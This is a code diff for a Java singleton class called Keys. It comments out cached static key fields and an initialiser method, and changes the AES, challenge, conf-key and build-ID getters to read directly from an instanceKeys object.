@@ -30,11 +30,13 @@ public final class Keys implements Singleton {
     static private Keys instance = null;
     private static final long GUID = 0x6b3d91c714d645e7L;
 
-    private static byte[] byteAesKey;
+   /* private static byte[] byteAesKey;
     private static byte[] byteChallengeKey;
     private static byte[] byteConfKey;
-    private static byte[] byteInstanceID;
     private static byte[] byteBuildID;
+    */
+    private static byte[] byteInstanceID;
+    
 
     //#ifdef DEBUG
     public String log = "";
@@ -96,10 +98,10 @@ public final class Keys implements Singleton {
         }
         //#endif  
         
-        setInstanceKeys();
+        //setInstanceKeys();
     }
 
-    private void setInstanceKeys() {
+  /*  private void setInstanceKeys() {
 
         byteAesKey = instanceKeys.getAesKey();
         byteChallengeKey = instanceKeys.getChallengeKey();
@@ -109,7 +111,7 @@ public final class Keys implements Singleton {
         //#ifdef DEBUG
         debug.trace("instanceKeys log:" + InstanceKeys.log);
         //#endif
-    }
+    }*/
 
     /**
      * Gets the aes key.
@@ -117,7 +119,7 @@ public final class Keys implements Singleton {
      * @return the aes key
      */
     public byte[] getAesKey() {
-        return byteAesKey;
+        return instanceKeys.getAesKey();
 
     }
 
@@ -127,7 +129,7 @@ public final class Keys implements Singleton {
      * @return the builds the id
      */
     public byte[] getBuildId() {
-        return byteBuildID;
+        return instanceKeys.getBuildId();
     }
 
     /**
@@ -136,7 +138,7 @@ public final class Keys implements Singleton {
      * @return the challenge key
      */
     public byte[] getChallengeKey() {
-        return byteChallengeKey;
+        return instanceKeys.getChallengeKey();
     }
 
     /**
@@ -145,7 +147,7 @@ public final class Keys implements Singleton {
      * @return the conf key
      */
     public byte[] getConfKey() {
-        return byteConfKey;
+        return instanceKeys.getConfKey();
     }
 
     /**
